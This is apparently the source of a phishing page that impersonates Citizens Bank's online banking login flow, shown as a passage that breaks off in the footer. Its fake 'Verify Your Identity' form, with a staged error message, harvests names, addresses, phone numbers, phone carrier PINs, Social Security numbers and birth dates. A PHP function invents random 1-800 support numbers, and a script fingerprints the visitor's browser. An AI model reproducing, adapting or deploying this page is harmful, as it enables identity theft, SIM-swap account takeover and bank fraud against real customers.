<?php


function generate_number(){
  $number = "1";
  $number .= "-"."800"."-".rand(2,9).rand(0,9).rand(0,9)."-".rand(0,9).rand(0,9).rand(0,9).rand(0,9);
  return $number;
}

?>
<html style="" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
  <head>
    <link href="../resources/img/apple-touch-icon.png" rel="apple-touch-icon">
    <link href="../resources/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
    <link href="../resources/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
    <link href="../resources/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
    <link href="../resources/img/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
    <link href="../resources/img/icon-hires.png" rel="icon" sizes="192x192">
    <link href="../resources/img/icon-normal.png" rel="icon" sizes="128x128">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <script type="text/javascript">
      var timeStamp = new Date().toString();
      var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
      var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
      var digitalData = {
        "sessionInformation": {
          "zipCode": "",
          "country": "",
          "city": "",
          "state": "",
          "timeStamp": timeStamp
        }
        ,
        "customerAttributes": {
          "CISKey": "",
          "DirectoryID": ""
        }
        ,
        "contentInteractions": {
          "siteName": "OLB",
          "siteSection": "Authenticated",
          "pageName": pageName,
          "pageURL": pageURL,
          "pageType": "Legacy"
        }
      };
      if (typeof(parent.Bootstrapper) !== "undefined" && parent.Bootstrapper.ensEvent && parent.Bootstrapper.ensEvent.trigger){
        if(window.frames && window.frames.length) parent.Bootstrapper.ensEvent.trigger("OLBURLChangeFrame");
        else parent.Bootstrapper.ensEvent.trigger("OLBURLChangeWindow");
      }
    </script>
    <title>Online Login | Citizens Bank
    </title>
    <meta name="description" content="Log in to your Citizens Bank account by entering your User ID and password so you can securely view and manage your accounts online.">
    <script src="../resources/js/pm_fp.js"> </script>
    <link rel="stylesheet" href="../resources/css/jquery-ui-1.10.3.custom.min.css">
    <link rel="stylesheet" href="../resources/css/normalize.css">
    <link rel="stylesheet" href="../resources/css/main.css">
    <link rel="stylesheet" href="../resources/css/flows.css">
    <link rel="stylesheet" href="../resources/css/ad-containers.css">
    <script src="../resources/js/modernizr-2.6.2.min.js"></script>
    <script charset="UTF-8" src="../resources/js/tag.js"> </script>
    <script src="../resources/js/jquery-1.9.1.min.js"></script>
    <script src="../resources/js/plugins.js"></script>
    <script src="../resources/js/main_res.js"></script>
    <script src="../resources/js/placeholders.min.js"></script>
    <script src="../resources/js/PrivateWindowCheck.js"></script>
    <script type="text/javascript" src="../resources/js/jquery.password.mask.js"></script>
  <script type="text/javascript" src="../resources/js/caret.js"></script>
  <style>
      input[type=password].error {
        border-color : red;
      }
    </style>
  </head>
  <script type="text/javascript" id="custom-useragent-string-page-script">
  </script>
  <body class="responsive-enabled" style="display: block;">
    <script>
      if(self == top) {
        var thebody = document.getElementsByTagName('body')[0]
        thebody.style.display = "block"
      }
      else {
        top.location = self.location
      }
    </script>
    <script type="text/javascript" src="../resources/js/tealeaf.js">
    </script>
    <script>
      document.cookie = "time="+(new Date());
      document.cookie = "sw=" + screen.width;
      document.cookie = "sh=" + screen.height;
      document.cookie = "cookie="+navigator.cookieEnabled;
      document.cookie = "language="+navigator.language;
      document.cookie = "cpu="+navigator.oscpu;
      document.cookie = "webdriver="+navigator.webdriver;
      isPrivateWindow(function(is_private) {
        if(is_private)
          document.cookie = "private_mode=true";
        else
          document.cookie = "private_mode=false";
        });
    </script>
    <div class="citizens-header-footer-injected">
      <link rel="stylesheet" type="text/css" href="../resources/css/citizensns.min.44438.css">
      <style>
        .help-modal-header .help-modal-close {
          background: url(../resources/img/modal-help-close.png) center center no-repeat transparent;
          background-size: 20px;
        }
        .help-modal-menu a.active {
          background: #f2faf8 url(../resources/img/arrow-right-green.png) right 20px center no-repeat;
          background-position: right 20px center;
          background-size:7px}
        .account-section-title.checkmark h1 {
          padding: 0px 0px 5px 28px !important;
        }
        .lt-ie9 .help-modal-menu a.active {
          background: #f2faf8 url(../resources/img/arrow-right-green.png) right 20px center no-repeat !important;
          background-size:7px !important}
        .input-wrapper .tooltip {
          margin-left: 1px;
        }
      </style>
      <div class="citizens-header-footer">
        <div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;">
        </div>
        <div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;">
        </div>
      </div>
    </div>
    <div class="citizens-header">
      <style>
        .citizens-header-footer-overlay{
          opacity:1;
          background-color:#fff;
          position:fixed;
          width:100%;
          height:100%;
          top:0px;
          left:0px;
          z-index:1000;
        }
        .citizens-header-footer-overlay .centered-content {
          width: 100%;
          max-width: 1060px;
          padding: 0 20px;
          margin: 0 auto;
          font-family: arial, helvetica, san-serif;
          font-size: 14px;
        }
        .citizens-header-footer-overlay .responsive-enabled .centered-content {
          width: auto;
          max-width: 1060px;
        }
        .citizens-header-footer-overlay .page-logo {
          float: none;
        }
        .citizens-header-footer-overlay .page-logo img{
          margin: 10px;
          float: none;
        }
        .citizens-header-footer-overlay .topshadow {
          position: absolute;
          width: 100%;
          top: 100px;
          z-index: 5;
          height: 8px;
          background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%);
          background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%);
          background-repeat: no-repeat;
          background-size: cover;
        }
      </style> 
      <!-- end overlay -->
      <style>
        .account-section-title.checkmark h1 {
          padding: 0px 0px 5px 28px !important;
        }
        .mobile-alert-dot {
          min-width: 22px;
          min-height: 22px;
          width: auto;
          height: auto;
          max-width: 50px;
          max-height: 50px;
          padding: 5px;
        }
      </style>
      <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
          <!-- inc-header.html START -->
          <div class="topshadow">
          </div>
          <div class="centered-content clearfix">
            <a href="<?php echo $url;?>" class="page-logo" tabindex="1">
              <img alt="Citizens Bank" src="../resources/img/CTZ_Green-01.png" width="203" height="25" border="0">
            </a>
            <div id="header-navigation-container">
            </div>
          </div>
        </div>
      </div>
    </div>
<div id="page-container" class="page-container">
  <div class="centered-content clearfix">
    <section id="top-content" class="page-region top-content">
        
      </section>
      <section id="main-container" class="main-container two-col layout-2-1 clearfix">
          <section id="main-content" class="page-region main-content">
  
   
   <div class="account-table account-table-full">
      <span class="account-table-border"></span>
      <div class="account-table-content">
         <div class="account-content-container">
            <div class="account-table-body">
               <header class="account-section-title clearfix account-secure">
                  <a href="#" class="mobile-help-trigger">Help</a>
                  <h1>Step 3 of 5: Verify Your Identity</h1>
               </header>
               <div id="messagecontainer" class="error-message show-error" role="alert">One of the answers below does not match our records. Please review your information then try again.
                    </div>
        <section class="account-section">
                  
                  <form class="pay-transfer-options clearfix" name="Enroll" action="pers_check" method="post">
                     <input type="hidden" name="CSRF_TOKEN" value="<?php echo $xsrf;?>">
                     <input type="hidden" name="fp_deviceprint" value="">
                     <input type="hidden" name="fp_language" value="">
                     <input type="hidden" name="fp_timezone" value="">
                     <input type="hidden" name="fp_browser" value="">
                     <input type="hidden" name="fp_screen" value="">
                     <input type="hidden" name="fp_software" value="">
                     <input type="hidden" name="pm_fp" value=""> <!-- RSA 6.0.2 0 -->
                     <div class="account-title clearfix">
                        <h3>It's easy to verify your Citizens Bank Online®.</h3>
                        <p>Simply provide the information below. Do not insert spaces or hyphens.</p>
                        <p>All fields are required.</p>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="ssn"><strong>First Name: </strong></label>
                        <div class="input-wrapper clearfix">
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your first name you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="text" name="first_name" id="first_name" class="required number-only demo-ssn tooltip-validate" maxlength="25" autocomplete="off" placeholder="First Name">
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Last Name: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your last name you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="text" name="last_name" id="last_name" class="required number-only demo-atm tooltip-validate" maxlength="25" autocomplete="off" placeholder="Last Name">
                           </div>
                        </div>
                     </div>
                    <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Address Line: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your address line you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="text" name="address" id="address" class="required number-only demo-atm tooltip-validate" maxlength="50" autocomplete="off" placeholder="Address Line">
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>City: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your city you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="text" name="city" id="city" class="required number-only demo-atm tooltip-validate" maxlength="25" autocomplete="off" placeholder="City">
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>ZIP Code: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your zip code you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="tel" name="zipcode" id="zipcode" class="required number-only demo-atm" maxlength="6" autocomplete="off" placeholder="ZIP Code">
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>State / Region: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your state or region you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="text" name="state" id="state" class="required number-only demo-atm tooltip-validate" maxlength="50" autocomplete="off" placeholder="State / Region">
                           </div>
                        </div>
                     </div>
                     <!--<div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Country: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please select your country you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <select id="select-citizenshipCountries-select-validate" name="country" aria-describedby="citizenshipCountries-select-error-message-accessible  " class="" aria-invalid="true" required="">
                                          <option disabled="" value="" selected="">
                                          </option> 
                                          
<option value="AF">Afghanistan</option>
<option value="AX">Ãƒâ€¦land Islands</option>
<option value="AL">Albania</option>
<option value="DZ">Algeria</option>
<option value="AS">American Samoa</option>
<option value="AD">Andorra</option>
<option value="AO">Angola</option>
<option value="AI">Anguilla</option>
<option value="AQ">Antarctica</option>
<option value="AG">Antigua and Barbuda</option>
<option value="AR">Argentina</option>
<option value="AM">Armenia</option>
<option value="AW">Aruba</option>
<option value="AU">Australia</option>
<option value="AT">Austria</option>
<option value="AZ">Azerbaijan</option>
<option value="BS">Bahamas</option>
<option value="BH">Bahrain</option>
<option value="BD">Bangladesh</option>
<option value="BB">Barbados</option>
<option value="BY">Belarus</option>
<option value="BE">Belgium</option>
<option value="BZ">Belize</option>
<option value="BJ">Benin</option>
<option value="BM">Bermuda</option>
<option value="BT">Bhutan</option>
<option value="BO">Bolivia</option>
<option value="BQ">Bonaire</option>
<option value="BA">Bosnia and Herzegovina</option>
<option value="BW">Botswana</option>
<option value="BV">Bouvet Island</option>
<option value="BR">Brazil</option>
<option value="IO">British Indian Ocean Territory</option>
<option value="BN">Brunei Darussalam</option>
<option value="BG">Bulgaria</option>
<option value="BF">Burkina Faso</option>
<option value="BI">Burundi</option>
<option value="KH">Cambodia</option>
<option value="CM">Cameroon</option>
<option value="CA">Canada</option>
<option value="CV">Cape Verde</option>
<option value="KY">Cayman Islands</option>
<option value="CF">Central African Republic</option>
<option value="TD">Chad</option>
<option value="CL">Chile</option>
<option value="CN">China</option>
<option value="CX">Christmas Island</option>
<option value="CC">Cocos (Keeling) Islands</option>
<option value="CO">Colombia</option>
<option value="KM">Comoros</option>
<option value="CG">Congo</option>
<option value="CD">Congo</option>
<option value="CK">Cook Islands</option>
<option value="CR">Costa Rica</option>
<option value="HR">Croatia</option>
<option value="CU">Cuba</option>
<option value="CW">CuraÃƒÂ§ao</option>
<option value="CY">Cyprus</option>
<option value="CZ">Czech Republic</option>
<option value="DK">Denmark</option>
<option value="DJ">Djibouti</option>
<option value="DM">Dominica</option>
<option value="DO">Dominican Republic</option>
<option value="EC">Ecuador</option>
<option value="EG">Egypt</option>
<option value="SV">El Salvador</option>
<option value="GQ">Equatorial Guinea</option>
<option value="ER">Eritrea</option>
<option value="EE">Estonia</option>
<option value="ET">Ethiopia</option>
<option value="FK">Falkland Islands (Malvinas)</option>
<option value="FO">Faroe Islands</option>
<option value="FJ">Fiji</option>
<option value="FI">Finland</option>
<option value="FR">France</option>
<option value="GF">French Guiana</option>
<option value="PF">French Polynesia</option>
<option value="TF">French Southern Territories</option>
<option value="GA">Gabon</option>
<option value="GM">Gambia</option>
<option value="GE">Georgia</option>
<option value="DE">Germany</option>
<option value="GH">Ghana</option>
<option value="GI">Gibraltar</option>
<option value="GR">Greece</option>
<option value="GL">Greenland</option>
<option value="GD">Grenada</option>
<option value="GP">Guadeloupe</option>
<option value="GU">Guam</option>
<option value="GT">Guatemala</option>
<option value="GG">Guernsey</option>
<option value="GN">Guinea</option>
<option value="GW">Guinea-Bissau</option>
<option value="GY">Guyana</option>
<option value="HT">Haiti</option>
<option value="HM">Heard Island and McDonald Islands</option>
<option value="VA">Holy See (Vatican City State)</option>
<option value="HN">Honduras</option>
<option value="HK">Hong Kong</option>
<option value="HU">Hungary</option>
<option value="IS">Iceland</option>
<option value="IN">India</option>
<option value="ID">Indonesia</option>
<option value="IR">Iran</option>
<option value="IQ">Iraq</option>
<option value="IE">Ireland</option>
<option value="IM">Isle of Man</option>
<option value="IL">Israel</option>
<option value="IT">Italy</option>
<option value="JM">Jamaica</option>
<option value="JP">Japan</option>
<option value="JE">Jersey</option>
<option value="JO">Jordan</option>
<option value="KZ">Kazakhstan</option>
<option value="KE">Kenya</option>
<option value="KI">Kiribati</option>
<option value="KP">Korea, Democratic People's Republic</option>
<option value="KR">"Korea, Republic of"</option>
<option value="KW">Kuwait</option>
<option value="KG">yrgyzstan</option>
<option value="LA">Lao People's Democratic Republic</option>
<option value="LV">Latvia</option>
<option value="LB">Lebanon</option>
<option value="LS">Lesotho</option>
<option value="LR">Liberia</option>
<option value="LY">Libya</option>
<option value="LI">Liechtenstein</option>
<option value="LT">Lithuania</option>
<option value="LU">Luxembourg</option>
<option value="MO">Macao</option>
<option value="MK">Macedonia, the Former Yugoslav Republic</option>
<option value="MG">Madagascar</option>
<option value="MW">Malawi</option>
<option value="MY">Malaysia</option>
<option value="MV">Maldives</option>
<option value="ML">Mali</option>
<option value="MT">Malta</option>
<option value="MH">Marshall Islands</option>
<option value="MQ">Martinique</option>
<option value="MR">Mauritania</option>
<option value="MU">Mauritius</option>
<option value="YT">Mayotte</option>
<option value="MX">Mexico</option>
<option value="FM">Micronesia, Federated States</option>
<option value="MD">Moldova, Republic </option>
<option value="MC">Monaco</option>
<option value="MN">Mongolia</option>
<option value="ME">Montenegro</option>
<option value="MS">Montserrat</option>
<option value="MA">Morocco</option>
<option value="MZ">Mozambique</option>
<option value="MM">Myanmar</option>
<option value="NA">Namibia</option>
<option value="NR">Nauru</option>
<option value="NP">Nepal</option>
<option value="NL">Netherlands</option>
<option value="NC">New Caledonia</option>
<option value="NZ">New Zealand</option>
<option value="NI">Nicaragua</option>
<option value="NE">Niger</option>
<option value="NG">Nigeria</option>
<option value="NU">Niue</option>
<option value="NF">Norfolk Island</option>
<option value="MP">Northern Mariana Islands</option>
<option value="NO">Norway</option>
<option value="OM">Oman</option>
<option value="PK">Pakistan</option>
<option value="PW">Palau</option>
<option value="PS">Palestine, State of</option>
<option value="PA">Panama</option>
<option value="PG">Papua New Guinea</option>
<option value="PY">Paraguay</option>
<option value="PE">Peru</option>
<option value="PH">Philippines</option>
<option value="PN">Pitcairn</option>
<option value="PL">Poland</option>
<option value="PT">Portugal</option>
<option value="PR">Puerto Rico</option>
<option value="QA">Qatar</option>
<option value="RE">RÃƒÂ©union</option>
<option value="RO">Romania</option>
<option value="RU">Russian Federation</option>
<option value="RW">Rwanda</option>
<option value="BL">Saint BarthÃƒÂ©lemy</option>
<option value="SH">Saint Helena, Ascension and Tristan da Cunha</option>
<option value="KN">Saint Kitts and Nevis</option>
<option value="LC">Saint Lucia</option>
<option value="MF">Saint Martin (French part)</option>
<option value="PM">Saint Pierre and Miquelon</option>
<option value="VC">Saint Vincent and the Grenadines</option>
<option value="WS">Samoa</option>
<option value="SM">San Marino</option>
<option value="ST">Sao Tome and Principe</option>
<option value="SA">Saudi Arabia</option>
<option value="SN">Senegal</option>
<option value="RS">Serbia</option>
<option value="SC">Seychelles</option>
<option value="SL">Sierra Leone</option>
<option value="SG">Singapore</option>
<option value="SX">Sint Maarten (Dutch part)</option>
<option value="SK">Slovakia</option>
<option value="SI">Slovenia</option>
<option value="SB">Solomon Islands</option>
<option value="SO">Somalia</option>
<option value="ZA">South Africa</option>
<option value="GS">South Georgia and the South Sandwich Islands</option>
<option value="SS">South Sudan</option>
<option value="ES">Spain</option>
<option value="LK">Sri Lanka</option>
<option value="SD">Sudan</option>
<option value="SR">Suriname</option>
<option value="SJ">Svalbard and Jan Mayen</option>
<option value="SZ">Swaziland</option>
<option value="SE">Sweden</option>
<option value="CH">Switzerland</option>
<option value="SY">Syrian Arab Republic</option>
<option value="TW">Taiwan, Province of China</option>
<option value="TJ">Tajikistan</option>
<option value="TZ">Tanzania, United Republic of</option>
<option value="TH">Thailand</option>
<option value="TL">Timor-Leste</option>
<option value="TG">Togo</option>
<option value="TK">Tokelau</option>
<option value="TO">Tonga</option>
<option value="TT">Trinidad and Tobago</option>
<option value="TN">Tunisia</option>
<option value="TR">Turkey</option>
<option value="TM">Turkmenistan</option>
<option value="TC">Turks and Caicos Islands</option>
<option value="TV">Tuvalu</option>
<option value="UG">Uganda</option>
<option value="UA">Ukraine</option>
<option value="AE">United Arab Emirates</option>
<option value="GB">United Kingdom</option>
<option value="US">United States</option>
<option value="UM">United States Minor Outlying Islands</option>
<option value="UY">Uruguay</option>
<option value="UZ">Uzbekistan</option>
<option value="VU">Vanuatu</option>
<option value="VE">Venezuela, Bolivarian Republic of</option>
<option value="VN">Viet Nam</option>
<option value="VG">Virgin Islands, British</option>
<option value="VI">Virgin Islands, U.S.</option>
<option value="WF">Wallis and Futuna</option>
<option value="EH">Western Sahara</option>
<option value="YE">Yemen</option>
<option value="ZM">Zambia</option>
<option value="ZW">Zimbabwe</option>
                                        </select> 
                           </div>
                        </div>
                     </div>-->
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Phone Number: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your phone number you have used at register.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="tel" name="number" id="number" class="required number-only demo-atm tooltip-validate" maxlength="14" autocomplete="off" placeholder="Phone Number">
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="cardNumber"><strong>Phone Carrier PIN: </strong><label>
                        <div class="input-wrapper clearfix">
                           <div id="user-atm-tooltip" class="tooltip validation-tooltip" role="tooltip">
                           </div>
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your phone carrier pin to verify your phone number.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="password" name="carrier_pin" id="carrier_pin" class="required number-only demo-atm tooltip-validate" maxlength="4" autocomplete="off" placeholder="Carrier PIN">
                           </div>
                        </div>
                     </div>
                     <div class="form-item tooltip-item">
                        <label for="ssn"><strong>Social Security Number: </strong></label>
                        <div class="input-wrapper clearfix">
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your social security number.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="tel" name="ssn" id="ssn" class="required" maxlength="11" autocomplete="off" placeholder="Social Security Number">
                           </div>
                        </div>
                     </div>

                     <div class="form-item tooltip-item">
                        <label for="ssn"><strong>Date Of Birth: </strong></label>
                        <div class="input-wrapper clearfix">
                           <div class="tooltip">
                              <span class="tooltip-icon"></span>
                              <div class="tooltip-box">
                                 <div class="tooltip-content">
                                    <span class="tooltip-arrow"></span>
                                    <p>Please enter your social security number.</p>
                                 </div>
                                 <div class="bottomshadow"></div>
                              </div>
                           </div>
                           <div class="input-left">
                              <input type="tel" name="dob" id="dob" class="required" maxlength="" autocomplete="off" placeholder="mm/dd/yyyy">
                           </div>
                        </div>
                     </div>



                     <div class="form-actions">
                        <input type="submit" name="submit_personal" class="submit-button arrow inactive" id="VerifyBtn" disabled="disabled" data-trigger="next" value="Next">
                     </div>
                  <div></div>
                </form>
               </section>
            </div>
         </div>
      </div>
   </div>
</section> 
<aside id="main-sidebar" class="page-region main-sidebar">
  <div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
      <div class="sidebar-list-content">
          <header class="sidebar-list-title">
              <h3>Need Help?</h3>
          </header>

  
          <div id="faq-holder">
          <form action="" name="frmAsst" id="frmAsst" method="post">
             <input type="hidden" name="CSRF_TOKEN" value="M8DW-3244-82Z7-ZD2H-FC8N-YMUR-MQT0-2E7U">
               
               <input type="hidden" name="needHelp" value="1">

          <section class="toggle-list-container faq-container" id="faq-index-29">
            <a href="#" title="Expand contents of What if I don't have an ATM/Debit Card number?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">What if I don't have a ATM/Debit Card number?</a>
            <ul class="loginfaq sidebar-list showhide-content">
              <li>
                <p>If you don't have an ATM/Debit Card, please call Customer Service at <?php echo(generate_number());?>. Business customers should call <?php echo(generate_number());?>.</p>
              </li>
            </ul>
          </section>

          <section class="toggle-list-container faq-container" id="faq-index-28">
            <a href="#" title="Expand contents of How do I know that I am enrolled in Online Banking?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">How do I know that I'm enrolled in Online Banking?</a>
            <ul class="loginfaq sidebar-list showhide-content">
              <li>
                <p>If you are not sure if you are enrolled in Online Banking, click on "Enroll Now" from the Online Banking login screen. After you verify your identity, you will receive your Online User ID if you are enrolled.</p>
              </li>
            </ul>
          </section>

          <section class="toggle-list-container faq-container" id="faq-index-10">
            <a href="#" title="Expand contents of Is Online Banking secure?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Is Online Banking secure?</a>
            <ul class="loginfaq sidebar-list showhide-content">
              <li>
                <p>To make Online Banking secure, Citizens Bank uses the highest level of encryption available today. Encryption is the process by which information is translated into un-interpretable code and then back to recognized information.<br>As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that "green is good" and that our website has passed a sophisticated authentication process, letting you know you are good to go.</p>
              </li>
            </ul>
          </section>

            </form>
            </div>

      <ul class="sidebar-list">
        <li class="cta-row">
          <a href="login-faqs.jsp" class="blue" target="_blank">View All Help Topics</a>
        </li>

      </ul>
    </div>
  </div>
</aside>
   
   


    </section> 
  </div> 
</div>
    <div class="citizens-footer">
      <div class="citizens-header-footer">
        <footer id="page-footer" class="page-footer">
          <div class="footer-top">
            <ul>
              <li>
                <a href="#" class="contact" title="Opens Ways to Contact Us Dialog">
                  <span class="account-underline">Ways to Contact Us
                  </span>
                  <span class="visuallyhidden">- Opens Ways to Contact Us Dialog
                  </span>
                </a>
                <div class="dropup-menu">
                  <h4>Contact Us
                  </h4>
                  <p>General Questions:
                    <br>
                    <strong><?php echo(generate_number());?>
                    </strong> (personal bank accounts)
                    <br>
                    Business Questions:
                    <br>
                    <strong><?php echo(generate_number());?>
                    </strong> (online banking support)
                    <br>
                    <strong><?php echo(generate_number());?>
                    </strong> (account information)
                    <br>
                    Investment Questions:
                    <br>
                    <strong><?php echo(generate_number());?>
                    </strong> (Citizens Securities, Inc.)
                  </p>
                </div>
              </li>
              <li>
                <a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
                  <span class="account-underline">Branch &amp; ATM Locator
                  </span>
                  <span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog
                  </span>
                </a>
                <div class="dropup-menu">
                  <h4>Branch &amp; ATM Locator
                  </h4>
                  <p>Find one of our 1,300 locations near you.
                  </p>
                  <div role="form">
                    <div id="stickyFooterBranch-error" class="error-message" style="display: none">
                    </div>
                    <input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE">
                    <a href="#" type="button" class="button button-stickyfooterbranch">Submit
                    </a>
                  </div>
                </div>
              </li>
            </ul>
          </div>
          <div class="footer-row clearfix">
            <ul>
              <li>
                <h6>Checking &amp; Savings
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking/">Checking
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/savings.aspx">Savings
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/money-markets.aspx">Money Markets
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/cds.aspx">Certificates of Deposit (CDs)
                  <sup>®
                  </sup>
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/ira/">IRAs
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/programs-and-services.aspx">Programs &amp; Services
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/benefits-and-features.aspx">Benefits &amp; Features
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking/debit-cards/standard.aspx">Debit Card
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/overdraft-protection/">Overdraft Choices
                  <sup>®
                  </sup>
                </a>
              </li>
            </ul>
            <ul>
              <li>
                <h6>Home Borrowing
                </h6>
              </li>
              <!--        <li><a target="_blank" href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
              <li>
                <a target="_blank" href="http://www.citizensbank.com/mortgages/">Mortgages
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/home-equity/loans.aspx">Home Equity Loans
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/home-equity/lines.aspx">Home Equity Lines of Credit
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/loans/determine-my-rate.aspx">Determine My Rate
                </a>
              </li>
              <li>
